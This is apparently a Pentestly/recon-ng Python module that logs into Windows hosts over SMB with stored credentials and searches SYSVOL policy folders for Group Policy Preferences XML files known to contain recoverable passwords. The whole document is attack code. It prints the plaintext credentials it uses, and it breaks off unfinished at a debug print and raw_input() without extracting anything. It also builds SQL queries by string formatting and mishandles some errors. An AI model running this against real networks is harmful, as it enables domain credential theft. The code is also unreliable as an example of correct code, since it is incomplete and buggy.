from __future__ import print_function
from recon.core.module import BaseModule

import os
import subprocess

from libs.pentestlymodule import PentestlyModule
from libs.misc import parse_mimikatz

from collections import defaultdict

class Module(PentestlyModule):

    meta = {
        'name': 'Group Policy Preferences (GPP) Password Gatherer',
        'author': 'Cory Duplantis (@ctfhacker)',
        'description': 'Enumnerate through SYSVOL shares looking for files with  GPP Passwords',
        'query': 'SELECT host,username from pentestly_shares where readonly like "%SYSVOL%"',
    }

    def module_run(self, creds):
        paths = [
            "MACHINE\\Preferences\\Groups\\Groups.xml",
            "USER\\Preferences\\Groups\\Groups.xml",
            "MACHINE\\Preferences\\Services\\Services.xml",
            "USER\\Preferences\\Printers\\Printers.xml",
            "USER\\Preferences\\Drives\\Drives.xml",
            "MACHINE\\Preferences\\Datasources\\DataSources.xml",
            "USER\\Preferences\\Datasources\\DataSources.xml",
            "MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
            "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
        ]

        print(self.smb)
        for host, username in creds:
            password, domain = self.query('SELECT password,domain from pentestly_creds where username="{}" and host="{}"'.format(username, host))[0]
            if not password:
                self.error("Error getting password for {} @ {}".format(username, host))
            self.smb.hosts[host] = {'user':username, 'passwd':password, 'domain':domain, 'port': 445}
            success = self.smb.login(host, username, password, domain)
            self.output("Execution creds: {}\{}:{}@{}".format(domain, username, password, host))
            if success:
                domains = self.smb.list_path(host, 'SYSVOL', '', '', verbose=False, only_output=True)
                domains = [d for d in domains if d.get_shortname() not in ('.', '..')]
                for curr_domain in domains:
                    curr_path = '{}\\Policies'.format(curr_domain.get_shortname())
                    policies = self.smb.list_path(host, 'SYSVOL', curr_path, '', verbose=False, only_output=True)
                    policies = set([policy.get_shortname() for policy in policies])
                    for policy in policies:
                        curr_path = '{}\\Policies\\{}'.format(curr_domain.get_shortname(), policy)
                        for filepath in paths:
                            full_filepath = '{}\\{}'.format(curr_path, filepath)
                            self.output("Checking for {}".format(full_filepath))
                            try:
                                files = self.smb.list_path(host, 'SYSVOL', full_filepath, 'xml', verbose=False, only_output=False)
                            except Exception as e:
                                if 'NOT_FOUND' in str(e):
                                    continue
                            if files:
                                print(files)
                                raw_input()




